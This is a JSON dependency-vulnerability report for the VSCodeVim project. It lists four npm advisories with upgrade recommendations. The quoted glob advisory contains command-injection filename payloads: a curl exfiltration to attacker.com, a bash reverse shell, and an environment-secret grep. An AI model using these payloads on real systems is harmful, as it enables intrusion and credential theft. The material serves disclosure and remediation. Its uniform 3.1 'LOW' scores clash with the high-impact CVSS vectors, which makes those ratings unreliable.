@@ -1,0 +1,461 @@
+{
+  "analyzedAt": "2025-12-17T20:07:21.977Z",
+  "source": "VSCodeVim__Vim.osv.json",
+  "summary": {
+    "totalVulnerabilities": 4,
+    "uniqueVulnerabilities": 4,
+    "affectedPackages": 4,
+    "stalePackages": 4,
+    "stalePackagesOldFix": 2,
+    "severityBreakdown": {
+      "CRITICAL": 0,
+      "HIGH": 0,
+      "MEDIUM": 0,
+      "LOW": 4
+    },
+    "recentVulnerabilities": 1,
+    "hasFixAvailable": 4
+  },
+  "vulnerabilities": [
+    {
+      "id": "GHSA-5j98-mcp5-4vw2",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-64756"
+      ],
+      "summary": "glob CLI: Command injection via -c/--cmd executes matches with shell:true",
+      "details": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",
+      "cwes": [
+        {
+          "id": "CWE-78",
+          "name": "OS Command Injection"
+        }
+      ],
+      "age": {
+        "age": "Very Recent (< 1 month)",
+        "isRecent": true,
+        "publishedDate": "2025-11-17T17:38:56Z",
+        "modifiedDate": "2025-11-19T02:30:52Z",
+        "daysSincePublished": 30
+      },
+      "affected": {
+        "package": "glob",
+        "version": "10.4.5",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "10.4.5",
+        "fixedIn": "11.1.0",
+        "recommendation": "Upgrade to 11.1.0 or later",
+        "fixAvailableSince": "2025-11-19T02:30:52.000Z",
+        "daysSinceFix": 28,
+        "monthsSinceFix": 0,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64756"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/isaacs/node-glob"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-35jh-r3h4-6jhm",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2021-23337"
+      ],
+      "summary": "Command Injection in lodash",
+      "details": "`lodash` versions prior to 4.17.21 are vulnerable to Command Injection via the template function.",
+      "cwes": [
+        {
+          "id": "CWE-77",
+          "name": "Unknown CWE"
+        },
+        {
+          "id": "CWE-94",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "4 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2021-05-06T16:05:51Z",
+        "modifiedDate": "2025-08-12T21:55:57.719943Z",
+        "daysSincePublished": 1686
+      },
+      "affected": {
+        "package": "lodash.template",
+        "version": "4.5.0",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "4.5.0",
+        "fixedIn": "4.17.21",
+        "recommendation": "Upgrade to 4.17.21 or later",
+        "fixAvailableSince": "2025-08-12T21:55:57.719Z",
+        "daysSinceFix": 126,
+        "monthsSinceFix": 4,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-23337"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c"
+        },
+        {
+          "type": "WEB",
+          "url": "https://www.oracle.com/security-alerts/cpuoct2021.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://www.oracle.com/security-alerts/cpujul2022.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://www.oracle.com/security-alerts/cpujan2022.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://www.oracle.com//security-alerts/cpujul2021.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://snyk.io/vuln/SNYK-JS-LODASH-1040724"
+        },
+        {
+          "type": "WEB",
+          "url": "https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1074929"
+        },
+        {
+          "type": "WEB",
+          "url": "https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWERGITHUBLODASH-1074931"
+        },
+        {
+          "type": "WEB",
+          "url": "https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-1074928"
+        },
+        {
+          "type": "WEB",
+          "url": "https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARS-1074930"
+        },
+        {
+          "type": "WEB",
+          "url": "https://snyk.io/vuln/SNYK-JAVA-ORGFUJIONWEBJARS-1074932"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.netapp.com/advisory/ntap-20210312-0006"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2021-23337.yml"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/lodash/lodash/blob/ddfd9b11a0126db2302cb70ec9973b66baec0975/lodash.js#L14851"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/lodash/lodash"
+        },
+        {
+          "type": "WEB",
+          "url": "https://cert-portal.siemens.com/productcert/pdf/ssa-637483.pdf"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-xvch-5gv4-984h",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2021-44906"
+      ],
+      "summary": "Prototype Pollution in minimist",
+      "details": "Minimist prior to 1.2.6 and 0.2.4 is vulnerable to Prototype Pollution via file `index.js`, function `setKey()` (lines 69-95).",
+      "cwes": [
+        {
+          "id": "CWE-1321",
+          "name": "Improperly Controlled Modification of Object Prototype Attributes (Prototype Pollution)"
+        }
+      ],
+      "age": {
+        "age": "3 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2022-03-18T00:01:09Z",
+        "modifiedDate": "2025-01-14T10:12:15.693708Z",
+        "daysSincePublished": 1370
+      },
+      "affected": {
+        "package": "minimist",
+        "version": "1.2.5",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "1.2.5",
+        "fixedIn": "1.2.6",
+        "recommendation": "Upgrade to 1.2.6 or later",
+        "fixAvailableSince": "2025-01-14T10:12:15.693Z",
+        "daysSinceFix": 337,
+        "monthsSinceFix": 11,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-44906"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/minimistjs/minimist/issues/11"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/substack/minimist/issues/164"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/minimistjs/minimist/pull/24"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/minimistjs/minimist/commit/34e20b8461118608703d6485326abbb8e35e1703"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/minimistjs/minimist/commit/bc8ecee43875261f4f17eb20b1243d3ed15e70eb"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/minimistjs/minimist/commit/c2b981977fa834b223b408cfb860f933c9811e4d"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/minimistjs/minimist/commit/ef9153fc52b6cea0744b2239921c5dcae4697f11"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/Marynk/JavaScript-vulnerability-detection/blob/main/minimist%20PoC.zip"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/minimistjs/minimist/commits/v0.2.4"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/substack/minimist"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/substack/minimist/blob/master/index.js#L69"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.netapp.com/advisory/ntap-20240621-0006"
+        },
+        {
+          "type": "WEB",
+          "url": "https://snyk.io/vuln/SNYK-JS-MINIMIST-559764"
+        },
+        {
+          "type": "WEB",
+          "url": "https://stackoverflow.com/questions/8588563/adding-custom-properties-to-a-function/20278068#20278068"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-7p7h-4mm5-852v",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2021-33623"
+      ],
+      "summary": "Uncontrolled Resource Consumption in trim-newlines",
+      "details": "@rkesters/gnuplot is an easy to use node module to draw charts using gnuplot and ps2pdf. The trim-newlines package before 3.0.1 and 4.x before 4.0.1 for Node.js has an issue related to regular expression denial-of-service (ReDoS) for the `.end()` method.",
+      "cwes": [
+        {
+          "id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption (DoS)"
+        }
+      ],
+      "age": {
+        "age": "4 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2021-06-07T22:10:39Z",
+        "modifiedDate": "2023-11-08T04:06:06.114400Z",
+        "daysSincePublished": 1653
+      },
+      "affected": {
+        "package": "trim-newlines",
+        "version": "1.0.0",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "1.0.0",
+        "fixedIn": "3.0.1",
+        "recommendation": "Upgrade to 3.0.1 or later",
+        "fixAvailableSince": "2023-11-08T04:06:06.114Z",
+        "daysSinceFix": 770,
+        "monthsSinceFix": 25,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-33623"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/sindresorhus/trim-newlines/commit/25246c6ce5eea1c82d448998733a6302a4350d91"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/sindresorhus/trim-newlines/commit/b10d5f4afef832b16bc56d49fc52c68cbd403869"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/sindresorhus/trim-newlines"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/sindresorhus/trim-newlines/releases/tag/v4.0.1"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2022/12/msg00033.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.netapp.com/advisory/ntap-20210702-0007"
+        },
+        {
+          "type": "WEB",
+          "url": "https://www.npmjs.com/package/trim-newlines"
+        }
+      ]
+    }
+  ],
+  "staleDependencies": [
+    {
+      "package": "glob",
+      "currentVersion": "10.4.5",
+      "fixedIn": "11.1.0",
+      "vulnerabilities": [
+        "GHSA-5j98-mcp5-4vw2"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 11.1.0 or later",
+      "fixAvailableSince": "2025-11-19T02:30:52.000Z",
+      "daysSinceFix": 28,
+      "monthsSinceFix": 0,
+      "isOldFix": false
+    },
+    {
+      "package": "lodash.template",
+      "currentVersion": "4.5.0",
+      "fixedIn": "4.17.21",
+      "vulnerabilities": [
+        "GHSA-35jh-r3h4-6jhm"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 4.17.21 or later",
+      "fixAvailableSince": "2025-08-12T21:55:57.719Z",
+      "daysSinceFix": 126,
+      "monthsSinceFix": 4,
+      "isOldFix": false
+    },
+    {
+      "package": "minimist",
+      "currentVersion": "1.2.5",
+      "fixedIn": "1.2.6",
+      "vulnerabilities": [
+        "GHSA-xvch-5gv4-984h"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 1.2.6 or later",
+      "fixAvailableSince": "2025-01-14T10:12:15.693Z",
+      "daysSinceFix": 337,
+      "monthsSinceFix": 11,
+      "isOldFix": true
+    },
+    {
+      "package": "trim-newlines",
+      "currentVersion": "1.0.0",
+      "fixedIn": "3.0.1",
+      "vulnerabilities": [
+        "GHSA-7p7h-4mm5-852v"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 3.0.1 or later",
+      "fixAvailableSince": "2023-11-08T04:06:06.114Z",
+      "daysSinceFix": 770,
+      "monthsSinceFix": 25,
+      "isOldFix": true
+    }
+  ],
+  "recommendations": [
+    {
+      "priority": "MEDIUM",
+      "message": "1 vulnerabilities were recently discovered (< 6 months old)."
+    },
+    {
+      "priority": "HIGH",
+      "message": "2 packages have fixes available for >6 months. Update urgently!"
+    },
+    {
+      "priority": "MEDIUM",
+      "message": "4 packages have known vulnerabilities with available fixes. Update recommended."
+    }
+  ]
+}
